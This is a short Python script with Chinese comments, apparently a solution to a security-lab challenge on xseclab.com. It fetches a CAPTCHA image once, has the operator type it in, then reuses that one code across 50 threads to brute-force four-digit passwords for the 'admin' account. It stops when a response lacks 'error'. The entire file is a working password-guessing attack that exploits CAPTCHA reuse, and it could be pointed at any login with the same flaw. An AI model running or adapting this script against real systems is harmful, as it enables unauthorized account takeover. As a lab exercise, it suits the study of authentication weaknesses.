import requests, re
import threading
import urllib.request


url = 'http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/index.php'
login = 'http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php'
s = requests.session()
c = s.get(url).content.decode('utf-8')


# 下载验证码
pic_url = re.findall(r'<img src="(.*?)">', c, re.S)
pic = requests.get(pic_url[0], timeout=10)
f = open('code.jpg', 'wb')
f.write(pic.content)
f.close()


# 输入验证码
print("input code:")
code = input()


lock = threading.Lock()

curTask = 1000
maxTask = 10000
flag = False
right = ''


def thread():
    global lock
    global curTask
    global maxTask
    global flag
    global right

    while not flag:  # 当flag为假也就是正确密码还没出来时，不断取任务来完成
        lock.acquire()  # 取任务  #这个过程不能被打断
        myTask = curTask
        curTask = curTask + 1
        lock.release()

        if myTask >= maxTask:  # 所有任务已经完成就退出
            break

        data = {'username': 'admin', 'pwd': str(myTask), 'vcode': code, 'submit': 'submit'}
        c1 = s.post(login, data=data).content.decode('utf-8')
        print(str(myTask) + ':' + c1)

        if 'error' not in c1:
            right = str(myTask) + ', ' + c1
            flag = True  # 当密码正确时，flag为真


# 多线程执行
threadNum = 50
threadlist = []
for i in range(threadNum):
    threadlist.append(threading.Thread(target=thread))

for i in threadlist:
    i.start()
for i in threadlist:
    i.join()

# 最终输出正确结果
print('pwd is ' + right)
